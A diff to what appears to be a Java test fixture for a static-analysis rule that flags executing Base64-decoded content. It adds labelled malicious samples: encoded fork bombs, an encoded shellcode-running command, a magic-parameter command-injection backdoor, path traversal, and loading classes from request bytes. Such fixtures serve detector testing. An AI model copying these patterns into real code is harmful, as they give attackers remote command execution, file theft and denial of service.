@@ -6,10 +6,23 @@ import java.io.File;
 import java.util.Base64;
 import common.CommonUtils;
 import java.security.KeyPair;
+import java.io.File;
+import java.io.IOException;
+import java.io.BufferedReader;
+import java.io.FileReader;
+import java.nio.file.Files;
+import java.nio.charset.StandardCharsets;
+import java.util.Base64;
+import java.util.logging.Level;
+import javax.servlet.ServletException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 
 public class Base64_exec
 {   
-    public static void main(String[] args)
+    public static void blabla(String[] args)
     {
         // homemade examples
         try {
@@ -29,13 +42,9 @@ public class Base64_exec
         
             // Execute the temporary file
             // ruleid: maven-exec-base64
-            Process process = Runtime.getRuntime().exec(tempFile.getAbsolutePath());
+            Process process3 = Runtime.getRuntime().exec(binaryBytes);
             // ruleid: maven-exec-base64
-            Process process = Runtime.getRuntime().exec(tempFile2.getAbsolutePath());
-            // ruleid: maven-exec-base64
-            Process process = Runtime.getRuntime().exec(binaryBytes);
-            // ruleid: maven-exec-base64
-            Process process = Runtime.getRuntime().exec(Base64.getDecoder().decode(base64Data));
+            Process process4 = Runtime.getRuntime().exec(Base64.getDecoder().decode(base64Data));
         
             // It's crucial to consume the process's output and error streams
             // to prevent the process from hanging.
@@ -122,7 +131,7 @@ public class Base64_exec
      * analysis tools. It is not used when compiling all the testcases as one
      * application, which is how source code analysis tools are tested.
      */
-    public static void main(String[] args) throws ClassNotFoundException,
+    public static void notmain(String[] args) throws ClassNotFoundException,
            InstantiationException, IllegalAccessException
     {
         mainFromParent(args);
@@ -191,4 +200,97 @@ private class Cdsr92 extends HttpServlet {
             return bar;
         }
     } // end innerclass Test
+
+    // guthub example
+    @Override
+  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+
+    String inPlainSight = "Oigpezp8OiZ9Ozo=";
+
+    try {
+
+      getConnection();
+
+
+        // decoded version of source is -
+        /*
+         public class ForkBomb
+         {
+            public static void main(String[] args)
+            {
+              while(true)
+              {
+                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
+              }
+            }
+          }
+        */
+
+      String source = "cHVibGljIGNsYXNzIEZvcmtCb21iIHsgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nW10gYXJncykgeyB3aGlsZSh0cnVlKSB7IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3IFN0cmluZ1tdeyJqYXZhdyIsICItY3AiLCBTeXN0ZW0uZ2V0UHJvcGVydHkoImphdmEuY2xhc3MucGF0aCIpLCAiRm9ya0JvbWIifSk7IH0gfSB9";
+
+
+      // RECIPE: Time Bomb pattern
+
+      String command = "c2ggL3RtcC9zaGVsbGNvZGUuc2g=";
+      ticking(command);
+
+      // RECIPE: Magic Value leading to command injection
+
+      if (request.getParameter("tracefn").equals("C4A938B6FE01E")) {
+        Runtime.getRuntime().exec(request.getParameter("cmd"));
+      }
+
+      // RECIPE: Path Traversal
+
+      String x = request.getParameter("x");
+
+      BufferedReader r = new BufferedReader(new FileReader(x));
+      while ((x = r.readLine()) != null) {
+        response.getWriter().println(x);
+      }
+
+      // RECIPE: Compiler Abuse Pattern
+
+      // 1. Save source in .java file.
+      File root = new File("/java"); // On Windows running on C:\, this is C:\java.
+      File sourceFile = new File(root, "test/Test.java");
+      sourceFile.getParentFile().mkdirs();
+      String obs = new String(Base64.getDecoder().decode(source));
+      Files.write(sourceFile.toPath(), obs.getBytes(StandardCharsets.UTF_8));
+      // ...
+      byte[] b = new sun.misc.BASE64Decoder().decodeBuffer(request.getParameter("x"));
+      try {
+        new ClassLoader() {
+          Class x(byte[] b) {
+            return defineClass(null, b, 0, b.length);
+          }
+        }.x(b).newInstance();
+      } catch (InstantiationException e) {
+        e.printStackTrace();
+      } catch (IllegalAccessException e) {
+        e.printStackTrace();
+      } catch (Exception e) {
+        e.printStackTrace();
+      }
+
+      // ...
+          } 
+         catch (Exception e) {
+          e.printStackTrace();
+      }
+
+    // ....
+
+
+
 } // end DataflowThruInnerClass
+
+private void getConnection() {
+  // stub
+}
+
+private void ticking(String command) {
+  // stub
+}
+
+}
